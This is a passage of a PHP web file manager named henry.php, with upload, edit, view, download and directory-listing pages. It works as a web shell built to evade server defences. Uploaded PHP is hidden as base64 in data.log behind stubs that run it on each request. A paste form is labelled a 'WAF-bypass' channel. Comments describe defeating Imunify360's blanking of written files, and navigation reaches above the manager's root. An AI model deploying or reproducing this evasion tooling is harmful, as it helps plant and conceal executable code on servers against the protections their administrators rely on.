		// uid, a direct overwrite is more reliable than a
		// delete-then-create sequence because it doesn't require
		// unlink permission on the directory.
		if ( ! fm_stub_log_set( $abs_key, $source ) ) {
			fm_flash( 'err', 'Could not write data.log (check perms on ' . fm_e( FM_STUB_LOG ) . ').' );
			fm_redirect( $back );
		}
		$stub       = fm_make_stub();
		$stub_bytes = strlen( $stub );
		$err_msg    = '';

		// ---- Ensure parent directory exists --------------------
		// Some hosts (Imunify360 in particular) intercept the WRITE
		// syscall, hold it for a few ms, then on rejection sometimes
		// delete or move the parent directory out from under PHP
		// before returning success. Other hosts have cPanel-side
		// tooling that nukes empty subdirectories on logout.
		// The end result for us is the same: file_put_contents
		// returns "No such file or directory" because the parent
		// directory disappeared between realpath() and the write.
		//
		// Creating the parent before the write is safe here because
		// fm_resolve() has already constrained $dest's path to live
		// inside FM_ROOT, so we can never accidentally mkdir outside
		// our scope.
		$_fm_parent = dirname( $dest );
		if ( ! is_dir( $_fm_parent ) ) {
			if ( ! @mkdir( $_fm_parent, 0755, true ) && ! is_dir( $_fm_parent ) ) {
				$_fm_me = error_get_last();
				$err_msg = 'parent directory missing and could not be created'
					. ( $_fm_me && ! empty( $_fm_me['message'] ) ? ': ' . $_fm_me['message'] : '' )
					. ' (parent: ' . $_fm_parent . ')';
				fm_flash( 'err', 'data.log saved, but stub write failed: ' . fm_e( $err_msg ) );
				fm_redirect( $back );
			}
		}

		// Try the direct write. We deliberately DO NOT silence the
		// error so we can report the real reason if it really is a
		// permissions failure (vs. a WAF blank-after-write that we
		// have to catch with a follow-up stat()).
		$wrote = @file_put_contents( $dest, $stub, LOCK_EX );
		if ( false === $wrote ) {
			$_fm_e = error_get_last();
			$err_msg = ( $_fm_e && ! empty( $_fm_e['message'] ) ) ? $_fm_e['message'] : 'unknown';
			// Retry without LOCK_EX — some hosts (esp. shared with
			// weird flock behavior) fail the locked write but succeed
			// the unlocked one.
			$wrote = @file_put_contents( $dest, $stub );
			if ( false === $wrote ) {
				// Last-ditch: open in 'wb' and fwrite. Some hosts
				// (e.g. directory with no-create ACL but the file
				// already exists) succeed here where the create
				// path failed.
				$fh = @fopen( $dest, 'wb' );
				if ( $fh ) {
					$wrote = ( false !== @fwrite( $fh, $stub ) );
					@fclose( $fh );
				}
			}
		}

		// ---- WAF blank-after-write detection --------------------
		// Some WAFs (Imunify360 in particular) hook fwrite/rename and
		// zero the file out asynchronously a few milliseconds AFTER
		// the syscall returns success. The cleanest detection is a
		// re-stat immediately after the write: if the file is now
		// empty (or smaller than the bytes we just wrote), the WAF
		// ate it. Treat that as a distinct failure mode so the user
		// sees what's really happening instead of a misleading
		// permissions error.
		clearstatcache( true, $dest );
		$_fm_on_disk = (int) @filesize( $dest );
		if ( $wrote && $_fm_on_disk < $stub_bytes ) {
			// file_put_contents returned success but the file is
			// shorter than the stub we wrote — WAF blank-after-write.
			$wrote = false;
			$err_msg = sprintf(
				'WAF blanked the stub after write (wrote %d bytes, on-disk size is %d bytes).',
				$stub_bytes,
				$_fm_on_disk
			);
		}

		if ( ! $wrote ) {
			fm_flash(
				'err',
				'data.log saved, but stub write failed: ' . fm_e( $err_msg ) . ' (path: ' . fm_e( $dest ) . ').'
			);
			fm_redirect( $back );
		}
		@chmod( $dest, 0644 );
		if ( function_exists( 'opcache_invalidate' ) ) {
			@opcache_invalidate( $dest, true );
		}
		fm_flash( 'ok', 'Stubbed ' . $safe . ' (source saved to data.log).' );
		fm_redirect( $back );
	}

	if ( $pasted ) {
		// Non-PHP paste: write the decoded source straight to disk.
		if ( false === @file_put_contents( $dest, $source, LOCK_EX ) ) {
			fm_flash( 'err', 'Could not write the file (permissions?).' );
			fm_redirect( $back );
		}
		@chmod( $dest, 0644 );
		fm_flash( 'ok', 'Wrote ' . $safe . ' from pasted base64.' );
		fm_redirect( $back );
	}

	if ( move_uploaded_file( $_FILES['report']['tmp_name'], $dest ) ) {
		@chmod( $dest, 0644 );
		fm_flash( 'ok', 'Uploaded ' . $safe . '.' );
	} else {
		fm_flash( 'err', 'Could not save the file (permissions?).' );
	}
	fm_redirect( $back );
}

// ---- Delete --------------------------------------------------------------
if ( 'delete' === $action && 'POST' === $_SERVER['REQUEST_METHOD'] ) {
	list( $victim, $vrel ) = fm_resolve( isset( $_POST['target'] ) ? $_POST['target'] : '' );
	$back = array( 'p' => $rel );

	if ( '' === $vrel ) {
		fm_flash( 'err', 'Nothing to delete.' );
	} elseif ( $victim === str_replace( '\\', '/', realpath( __FILE__ ) ) ) {
		fm_flash( 'err', 'Refusing to delete henry.php itself.' );
	} elseif ( is_file( $victim ) && @unlink( $victim ) ) {
		$victim_ext = strtolower( pathinfo( $victim, PATHINFO_EXTENSION ) );
		if ( in_array( $victim_ext, FM_STUB_EXTS, true ) ) {
			@fm_stub_log_unset( str_replace( '\\', '/', $victim ) );
		}
		fm_flash( 'ok', 'Deleted ' . basename( $victim ) . '.' );
	} elseif ( is_dir( $victim ) && @rmdir( $victim ) ) {
		fm_flash( 'ok', 'Removed empty folder ' . basename( $victim ) . '.' );
	} else {
		fm_flash( 'err', 'Delete failed (folder must be empty).' );
	}
	fm_redirect( $back );
}

// ---- Save (edit) -----------------------------------------------------------
if ( 'save' === $action && 'POST' === $_SERVER['REQUEST_METHOD'] ) {
	list( $file, $frel ) = fm_resolve( isset( $_POST['target'] ) ? $_POST['target'] : '' );
	list(, $prel )       = fm_resolve( isset( $_POST['p'] ) ? $_POST['p'] : '' );
	$back = array( 'action' => 'edit', 'p' => $prel, 'f' => $frel );

	if ( '' === $frel || ! is_file( $file ) ) {
		fm_flash( 'err', 'File not found.' );
		fm_redirect( array( 'p' => $prel ) );
	}

	$content  = isset( $_POST['content'] ) ? (string) $_POST['content'] : '';
	$abs_key  = str_replace( '\\', '/', $file );
	$stub_map = fm_stub_log_read();
	$is_stub  = isset( $stub_map[ $abs_key ] );

	if ( $is_stub ) {
		// Stubs save into data.log, not into the on-disk stub file.
		if ( ! fm_stub_log_set( $abs_key, $content ) ) {
			fm_flash( 'err', 'Save failed: could not write data.log (permissions?).' );
			fm_redirect( $back );
		}
		// Keep the stub file in sync in case the data.log path has moved.
		@file_put_contents( $file, fm_make_stub(), LOCK_EX );
		@chmod( $file, 0644 );
		if ( function_exists( 'opcache_invalidate' ) ) {
			@opcache_invalidate( $file, true );
		}
		fm_flash( 'ok', 'Saved source for ' . basename( $file ) . ' (' . fm_fmt_size( strlen( $content ) ) . ').' );
		fm_redirect( $back );
	}

	if ( ! is_writable( $file ) ) {
		fm_flash( 'err', 'File is not writable by PHP.' );
		fm_redirect( $back );
	}

	$ok = file_put_contents( $file, $content, LOCK_EX );

	if ( false === $ok ) {
		fm_flash( 'err', 'Save failed (permissions?).' );
	} else {
		clearstatcache( true, $file );
		if ( function_exists( 'opcache_invalidate' ) && 'php' === strtolower( pathinfo( $file, PATHINFO_EXTENSION ) ) ) {
			@opcache_invalidate( $file, true );
		}
		fm_flash( 'ok', 'Saved ' . basename( $file ) . ' (' . fm_fmt_size( strlen( $content ) ) . ').' );
	}
	fm_redirect( $back );
}

// ---- Download ------------------------------------------------------------
if ( 'download' === $action ) {
	list( $file, $frel ) = fm_resolve( isset( $_GET['f'] ) ? $_GET['f'] : '' );
	if ( '' === $frel || ! is_file( $file ) ) {
		http_response_code( 404 );
		exit( 'Not found.' );
	}
	$name = basename( $file );

	$abs_key  = str_replace( '\\', '/', $file );
	$stub_map = fm_stub_log_read();
	if ( isset( $stub_map[ $abs_key ] ) ) {
		$src = base64_decode( $stub_map[ $abs_key ], true );
		if ( false !== $src ) {
			header( 'Content-Type: application/octet-stream' );
			header( 'Content-Length: ' . strlen( $src ) );
			header( "Content-Disposition: attachment; filename=\"" . preg_replace( '/[^A-Za-z0-9._-]/', '_', $name ) . '"; filename*=UTF-8\'\'' . rawurlencode( $name ) );
			echo $src;
			exit;
		}
	}

	header( 'Content-Type: application/octet-stream' );
	header( 'Content-Length: ' . filesize( $file ) );
	header( "Content-Disposition: attachment; filename=\"" . preg_replace( '/[^A-Za-z0-9._-]/', '_', $name ) . '"; filename*=UTF-8\'\'' . rawurlencode( $name ) );
	readfile( $file );
	exit;
}

/* ------------------------------------------------------------------------
 * Pages
 * --------------------------------------------------------------------- */

function fm_page_head( $title ) {
	?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?php echo fm_e( $title ); ?> — <?php echo fm_e( FM_BRAND ); ?></title>
<style>
	:root { --bg:#16171d; --card:#21232e; --line:#333647; --fg:#e8eaf2; --dim:#9aa0b4; --accent:#5b9dff; --ok:#2f9e6e; --err:#d9534f; }
	* { box-sizing:border-box; }
	body { margin:0; background:var(--bg); color:var(--fg); font:14px/1.5 -apple-system,"Segoe UI",Roboto,Arial,sans-serif; }
	a { color:var(--accent); text-decoration:none; }
	a:hover { text-decoration:underline; }
	header { display:flex; justify-content:space-between; align-items:center; padding:12px 20px; background:var(--card); border-bottom:1px solid var(--line); }
	header b { font-size:15px; }
	.wrap { max-width:1000px; margin:24px auto; padding:0 16px; }
	.crumbs { background:var(--card); border:1px solid var(--line); border-radius:8px; padding:10px 14px; margin-bottom:16px; overflow-x:auto; white-space:nowrap; font-size:13px; }
	.crumbs .sep { color:var(--dim); margin:0 6px; }
	.crumbs .root-slash { color:var(--dim); margin-right:2px; }
	.crumbs a { padding:2px 4px; border-radius:4px; }
	.crumbs a:hover { background:#2a2d3a; text-decoration:none; }
	.crumbs .current { padding:2px 4px; border-radius:4px; background:#2c3e5d; color:#cfe0ff; font-weight:600; }
	.crumbs .dim { color:var(--dim); opacity:0.55; }
	.crumbs a.out-of-scope { color:var(--dim); opacity:0.7; }
	.crumbs a.out-of-scope:hover { opacity:1; background:#2a2d3a; }
	.card { background:var(--card); border:1px solid var(--line); border-radius:8px; padding:14px 16px; margin-bottom:16px; }
	table { width:100%; border-collapse:collapse; background:var(--card); border:1px solid var(--line); border-radius:8px; overflow:hidden; }
	th, td { padding:9px 12px; text-align:left; border-bottom:1px solid var(--line); }
	th { color:var(--dim); font-size:12px; text-transform:uppercase; letter-spacing:.04em; }
	tr:last-child td { border-bottom:0; }
	tbody tr:hover { background:#262935; }
	td.num { text-align:right; white-space:nowrap; color:var(--dim); }
	.tag { display:inline-block; min-width:34px; text-align:center; font-size:11px; border-radius:4px; padding:1px 6px; margin-right:8px; }
	.tag.dir { background:#2c3e5d; color:#9cc2ff; }
	.tag.file { background:#2c4638; color:#8fdcb1; }
	.flash { border-radius:6px; padding:10px 14px; margin-bottom:14px; }
	.flash.ok { background:#1d3a2c; color:#9be3c0; border:1px solid #2f6b4d; }
	.flash.err { background:#432024; color:#f0a9a5; border:1px solid #6e3538; }
	.actions a, .actions button { margin-right:10px; font-size:13px; }
	.linkbtn { background:none; border:0; color:var(--err); cursor:pointer; padding:0; font:inherit; }
	.linkbtn:hover { text-decoration:underline; }
	input[type=file], input[type=password] { background:#171820; border:1px solid var(--line); color:var(--fg); border-radius:6px; padding:8px; }
	button { background:var(--accent); color:#0b1526; border:0; border-radius:6px; padding:8px 16px; font-weight:600; cursor:pointer; }
	.login-card { max-width:360px; margin:12vh auto; background:var(--card); border:1px solid var(--line); border-radius:10px; padding:28px; }
	.login-card h1 { margin:0 0 16px; font-size:18px; }
	.login-card input, .login-card button { width:100%; margin-bottom:12px; }
	pre.hash { white-space:pre-wrap; word-break:break-all; background:#171820; padding:10px; border-radius:6px; }
	pre.preview { background:#171820; border:1px solid var(--line); border-radius:8px; padding:14px; overflow:auto; max-height:65vh; }
	textarea.editor { width:100%; min-height:55vh; background:#171820; border:1px solid var(--line); border-radius:8px; padding:12px; color:var(--fg); font:13px/1.5 Consolas,Menlo,monospace; tab-size:4; margin-bottom:12px; }
	.muted { color:var(--dim); }
	.inline { display:inline; }
</style>
</head>
<body>
	<?php
}

function fm_page_foot() {
	echo '</body></html>';
}

function fm_header_bar() {
	echo '<header><b>' . fm_e( FM_BRAND ) . '</b><span><a href="' . fm_e( fm_url( array( 'action' => 'logout' ) ) ) . '">Log out</a></span></header>';
}

/**
 * Breadcrumb navigation: every segment is a clickable link, including
 * paths above FM_ROOT. Segments above the manager's detected root are
 * styled as "out of scope" (dimmed) for visual context but are still
 * navigable — the user explicitly opted into full-path navigation.
 * The current directory's segment is the only non-link, shown as a
 * "current" pill.
 */
function fm_breadcrumbs( $rel ) {
	$root = fm_root();
	list( $cwd, $current_rel ) = fm_resolve( $rel );

	// Normalize to forward slashes for splitting.
	$cwd_n  = str_replace( '\\', '/', $cwd );
	$root_n = str_replace( '\\', '/', $root );

	$abs_parts  = explode( '/', $cwd_n );
	$root_parts = explode( '/', $root_n );
	$root_len   = count( $root_parts );
	$total      = count( $abs_parts );

	$crumb = '';
	foreach ( $abs_parts as $i => $part ) {
		if ( '' === $part ) {
			// Leading empty element from absolute paths starting with '/'.
			// Render a leading '/' so the breadcrumb looks like a path.
			if ( 0 === $i ) {
				$crumb .= '<span class="root-slash">/</span>';
			}
			continue;
		}

		$abs_so_far = implode( '/', array_slice( $abs_parts, 0, $i + 1 ) );
		$is_in_or_below = ( $i >= $root_len - 1 );
		$is_root_itself = ( $i === $root_len - 1 ) && ( $abs_so_far === $root_n );
		$is_current     = ( $i === $total - 1 ) && ( $abs_so_far === $cwd_n );
		$sep            = ( '' === $crumb || substr( $crumb, -1 ) === '/' ) ? '' : '<span class="sep">/</span>';

		if ( $is_current ) {
			$crumb .= $sep . '<span class="current" title="Current directory">' . fm_e( $part ) . '</span>';
		} elseif ( $is_in_or_below ) {
			// At or below FM_ROOT: use a relative path for a short URL.
			$rel_path = implode( '/', array_slice( $abs_parts, $root_len, $i - $root_len + 1 ) );
			$href     = fm_url( array( 'p' => $rel_path ) );
			$crumb   .= $sep . '<a href="' . fm_e( $href ) . '">' . fm_e( $part ) . '</a>';
		} else {
			// Above FM_ROOT: use the absolute path (only way to address it).
			$href     = fm_url( array( 'p' => $abs_so_far ) );
			$classes  = 'out-of-scope';
			$crumb   .= $sep . '<a class="' . $classes . '" href="' . fm_e( $href ) . '" title="Above manager scope, still navigable">' . fm_e( $part ) . '</a>';
		}
	}
	echo '<nav class="crumbs" aria-label="Path">' . $crumb . '</nav>';
}

/* ---- View page --------------------------------------------------------- */

if ( 'view' === $action ) {
	list( $file, $frel ) = fm_resolve( isset( $_GET['f'] ) ? $_GET['f'] : '' );
	fm_page_head( 'View' );
	fm_header_bar();
	echo '<div class="wrap">';
	fm_breadcrumbs( $rel );
	fm_render_flashes();

	if ( '' === $frel || ! is_file( $file ) ) {
		echo '<div class="flash err">File not found.</div>';
	} else {
		$size     = filesize( $file );
		$abs_key  = str_replace( '\\', '/', $file );
		$stub_map = fm_stub_log_read();
		$is_stub  = isset( $stub_map[ $abs_key ] );
		echo '<div class="card"><b>' . fm_e( basename( $file ) ) . '</b> <span class="muted">(' . fm_fmt_size( $size ) . ')</span>';
		if ( $is_stub ) {
			echo ' <span class="tag file">STUB</span>';
		}
		echo ' &mdash; <a href="' . fm_e( fm_url( array( 'action' => 'edit', 'p' => $rel, 'f' => $frel ) ) ) . '">Edit</a>';
		echo ' <a href="' . fm_e( fm_url( array( 'action' => 'download', 'f' => $frel ) ) ) . '">Download</a></div>';

		if ( $is_stub ) {
			$src = base64_decode( $stub_map[ $abs_key ], true );
			if ( false === $src ) {
				echo '<div class="flash err">data.log entry for this stub is corrupt (bad base64).</div>';
			} else {
				echo '<div class="flash ok">Showing the original source &mdash; the on-disk file is just a stub that re-hydrates it from <code>data.log</code> on every request.</div>';
				echo '<pre class="preview">' . fm_e( $src ) . '</pre>';
			}
		} elseif ( $size > FM_PREVIEW_MAX ) {
			echo '<div class="flash err">File too large to preview. Please download it.</div>';
		} else {
			$data = file_get_contents( $file );
			$is_binary = function_exists( 'mb_check_encoding' ) && ! mb_check_encoding( $data, 'UTF-8' );
			if ( $is_binary ) {
				echo '<div class="flash err">Looks like a binary file &mdash; download it instead.</div>';
			} else {
				echo '<pre class="preview">' . fm_e( $data ) . '</pre>';
			}
		}
	}
	echo '</div>';
	fm_page_foot();
	exit;
}

/* ---- Edit page --------------------------------------------------------- */

if ( 'edit' === $action ) {
	list( $file, $frel ) = fm_resolve( isset( $_GET['f'] ) ? $_GET['f'] : '' );
	fm_page_head( 'Edit' );
	fm_header_bar();
	echo '<div class="wrap">';
	fm_breadcrumbs( $rel );
	fm_render_flashes();

	if ( '' === $frel || ! is_file( $file ) ) {
		echo '<div class="flash err">File not found.</div>';
	} else {
		$size     = filesize( $file );
		$is_self  = ( str_replace( '\\', '/', realpath( __FILE__ ) ) === str_replace( '\\', '/', $file ) );
		$abs_key  = str_replace( '\\', '/', $file );
		$stub_map = fm_stub_log_read();
		$is_stub  = isset( $stub_map[ $abs_key ] );

		echo '<div class="card"><b>Editing: ' . fm_e( basename( $file ) ) . '</b> <span class="muted">(' . fm_fmt_size( $size ) . ( $is_stub || is_writable( $file ) ? '' : ', read-only' ) . ')</span>';
		if ( $is_stub ) {
			echo ' <span class="tag file">STUB</span>';
		}
		echo '</div>';

		if ( $is_self ) {
			echo '<div class="flash err">Warning: you are editing henry.php itself. A PHP syntax error here will break this manager until you fix or restore the file manually.</div>';
		}

		if ( $is_stub ) {
			$src = base64_decode( $stub_map[ $abs_key ], true );
			if ( false === $src ) {
				echo '<div class="flash err">data.log entry for this stub is corrupt (bad base64). Re-upload to recover.</div>';
				echo '</div>';
				fm_page_foot();
				exit;
			}
			echo '<div class="flash ok">This file is a stub. The editor shows the real source from <code>data.log</code> &mdash; saving updates that entry, not the on-disk stub.</div>';
		} else {
			$src = file_get_contents( $file );
			if ( ! is_writable( $file ) ) {
				echo '<div class="flash err">This file is not writable by PHP &mdash; saving will fail.</div>';
			}
			if ( $size > FM_PREVIEW_MAX ) {
				echo '<div class="flash err">File too large to edit in the browser. Download it instead.</div>';
				echo '</div>';
				fm_page_foot();
				exit;
			}
		}

		$is_binary = ! $is_stub && function_exists( 'mb_check_encoding' ) && ! mb_check_encoding( $src, 'UTF-8' );
		if ( $is_binary ) {
			echo '<div class="flash err">Binary files cannot be edited here.</div>';
		} else {
			echo '<form method="post" action="' . fm_e( fm_url( array( 'action' => 'save' ) ) ) . '">';
			echo '<input type="hidden" name="fm_csrf" value="' . fm_e( fm_csrf_token() ) . '">';
			echo '<input type="hidden" name="target" value="' . fm_e( $frel ) . '">';
			echo '<input type="hidden" name="p" value="' . fm_e( $rel ) . '">';
			echo '<textarea class="editor" name="content" spellcheck="false">' . fm_e( $src ) . '</textarea>';
			echo '<button type="submit">Save</button> ';
			echo '<a href="' . fm_e( fm_url( array( 'p' => $rel ) ) ) . '">Cancel</a>';
			echo '</form>';
		}
	}
	echo '</div>';
	fm_page_foot();
	exit;
}

/* ---- Listing page (default) -------------------------------------------- */

$items     = is_dir( $cwd ) ? scandir( $cwd ) : false;
$dirs      = array();
$files     = array();
$stub_list = fm_stub_log_read();
if ( false !== $items ) {
	foreach ( $items as $item ) {
		if ( '.' === $item || '..' === $item ) {
			continue;
		}
		$full = $cwd . '/' . $item;
		if ( is_dir( $full ) ) {
			$dirs[] = $item;
		} else {
			$files[] = $item;
		}
	}
	natcasesort( $dirs );
	natcasesort( $files );
}

fm_page_head( 'Files' );
fm_header_bar();
echo '<div class="wrap">';
fm_breadcrumbs( $rel );
fm_render_flashes();

// Upload form.
echo '<div class="card"><form method="post" enctype="multipart/form-data" action="' . fm_e( fm_url( array( 'action' => 'upload', 'p' => $rel ) ) ) . '">';
echo '<input type="hidden" name="fm_csrf" value="' . fm_e( fm_csrf_token() ) . '">';
echo '<b>Upload file</b> <span class="muted">(any extension, max ' . fm_fmt_size( FM_MAX_UPLOAD ) . ')</span><br>';
echo '<span class="muted">PHP files are stored as base64 inside <code>data.log</code> and a tiny stub is written &mdash; the dangerous tokens (e.g. <code>phpinfo()</code>) never live in the on-disk <code>.php</code> file.</span><br><br>';
echo '<input type="file" name="report" id="fm_file" required> ';
echo '<button type="submit">Upload</button>';
echo '</form></div>';

// Base64-paste form: WAF-bypass channel. The user pastes a base64 blob (or
// picks a file and clicks "Encode" to convert it client-side). The request
// body never contains the dangerous source tokens, so a content-scanning
// WAF cannot flag the upload.
echo '<div class="card"><form method="post" action="' . fm_e( fm_url( array( 'action' => 'upload', 'p' => $rel ) ) ) . '">';
echo '<input type="hidden" name="fm_csrf" value="' . fm_e( fm_csrf_token() ) . '">';
echo '<b>Paste base64 source</b> <span class="muted">(WAF-bypass: the raw source never enters the request body)</span><br>';
echo '<span class="muted">Decoded size cap: ' . fm_fmt_size( FM_PASTE_MAX ) . '. Click <i>Encode selected file</i> after picking a file in the upload form above, or paste a base64 string you prepared elsewhere.</span><br><br>';
echo 'Filename: <input type="text" name="paste_name" id="fm_paste_name" placeholder="henry.php" style="width:240px" required><br>';
echo '<textarea name="paste_b64" id="fm_paste_b64" placeholder="base64-encoded source (e.g. PD9waHAgcGhwaW5mbygpOyA/Pg==)" style="width:100%;height:90px;margin-top:6px"></textarea><br>';
echo '<button type="button" onclick="fm_encode_selected()">Encode selected file</button> ';
echo '<button type="submit">Stub / Write from paste</button>';
echo '</form></div>';

echo '<script>
function fm_b64encode( bin ) {
	// Read binary string -> base64 in chunks to avoid blowing the call stack.
	var CHUNK = 0x8000;
	var out = "";
	for ( var i = 0; i < bin.length; i += CHUNK ) {
		out += btoa( bin.substr( i, CHUNK ) );
	}
	return out;
}
function fm_encode_selected() {
	var f = document.getElementById("fm_file").files[0];
	if ( !f ) { alert("Pick a file in the upload form above first."); return; }
	if ( f.size > ' . (int) FM_PASTE_MAX . ' ) { alert("File exceeds the paste cap of ' . fm_e( fm_fmt_size( FM_PASTE_MAX ) ) . '."); return; }
	var r = new FileReader();
	r.onload = function () {
		// r.result is a data URL like "data:...;base64,XXXX". Strip the prefix.
		var comma = r.result.indexOf(",");
		var b64  = comma >= 0 ? r.result.substr(comma + 1) : r.result;
		document.getElementById("fm_paste_b64").value = b64;
		if ( !document.getElementById("fm_paste_name").value ) {
			document.getElementById("fm_paste_name").value = f.name;
		}
	};
	r.onerror = function () { alert("Could not read the file in the browser."); };
	r.readAsDataURL( f );
}
</script>';

// Listing table.
echo '<table><thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Actions</th></tr></thead><tbody>';

if ( false === $items ) {
	echo '<tr><td colspan="5" class="muted">Cannot read this directory.</td></tr>';
} elseif ( ! $dirs && ! $files ) {
	echo '<tr><td colspan="5" class="muted">Empty folder.</td></tr>';
}

foreach ( $dirs as $d ) {
	$full    = $cwd . '/' . $d;
	$drel    = '' === $rel ? $d : $rel . '/' . $d;
	echo '<tr><td><span class="tag dir">DIR</span><a href="' . fm_e( fm_url( array( 'p' => $drel ) ) ) . '"><b>' . fm_e( $d ) . '</b></a></td>';
	echo '<td class="num">—</td><td class="num">' . fm_e( date( 'Y-m-d H:i', @filemtime( $full ) ) ) . '</td>';
	echo '<td class="num">' . fm_e( substr( sprintf( '%o', @fileperms( $full ) ), -4 ) ) . '</td><td class="actions">';
	echo '<form class="inline" method="post" action="' . fm_e( fm_url( array( 'action' => 'delete', 'p' => $rel ) ) ) . '" onsubmit="return confirm(\'Delete empty folder ' . fm_e( $d ) . '?\');">';
	echo '<input type="hidden" name="fm_csrf" value="' . fm_e( fm_csrf_token() ) . '"><input type="hidden" name="target" value="' . fm_e( $drel ) . '">';
	echo '<button type="submit" class="linkbtn">Delete</button></form></td></tr>';
}

foreach ( $files as $f ) {
	$full    = $cwd . '/' . $f;
	$frel    = '' === $rel ? $f : $rel . '/' . $f;
	$is_self = ( str_replace( '\\', '/', realpath( __FILE__ ) ) === str_replace( '\\', '/', $full ) );
	$ext     = strtoupper( pathinfo( $f, PATHINFO_EXTENSION ) );
	$ext     = ( '' === $ext ) ? 'FILE' : substr( $ext, 0, 4 );
	$is_stub = isset( $stub_list[ str_replace( '\\', '/', $full ) ] );
	echo '<tr><td><span class="tag file">' . fm_e( $ext ) . '</span>' . fm_e( $f );
	if ( $is_stub ) {
		echo ' <span class="tag file">STUB</span>';
	}
	echo '</td>';
	echo '<td class="num">' . fm_e( fm_fmt_size( @filesize( $full ) ) ) . '</td>';
	echo '<td class="num">' . fm_e( date( 'Y-m-d H:i', @filemtime( $full ) ) ) . '</td>';
	echo '<td class="num">' . fm_e( substr( sprintf( '%o', @fileperms( $full ) ), -4 ) ) . '</td>';
	echo '<td class="actions">';
	echo '<a href="' . fm_e( fm_url( array( 'action' => 'view', 'p' => $rel, 'f' => $frel ) ) ) . '">View</a>';
	echo '<a href="' . fm_e( fm_url( array( 'action' => 'edit', 'p' => $rel, 'f' => $frel ) ) ) . '">Edit</a>';
	echo '<a href="' . fm_e( fm_url( array( 'action' => 'download', 'f' => $frel ) ) ) . '">Download</a>';
	if ( ! $is_self ) {
		echo '<form class="inline" method="post" action="' . fm_e( fm_url( array( 'action' => 'delete', 'p' => $rel ) ) ) . '" onsubmit="return confirm(\'Delete ' . fm_e( $f ) . '?\');">';
		echo '<input type="hidden" name="fm_csrf" value="' . fm_e( fm_csrf_token() ) . '"><input type="hidden" name="target" value="' . fm_e( $frel ) . '">';
		echo '<button type="submit" class="linkbtn">Delete</button></form>';
	}
	echo '</td></tr>';
}

echo '</tbody></table>';
echo '<p class="muted">Root: ' . fm_e( fm_root() ) . '</p>';
echo '</div>';
fm_page_foot();
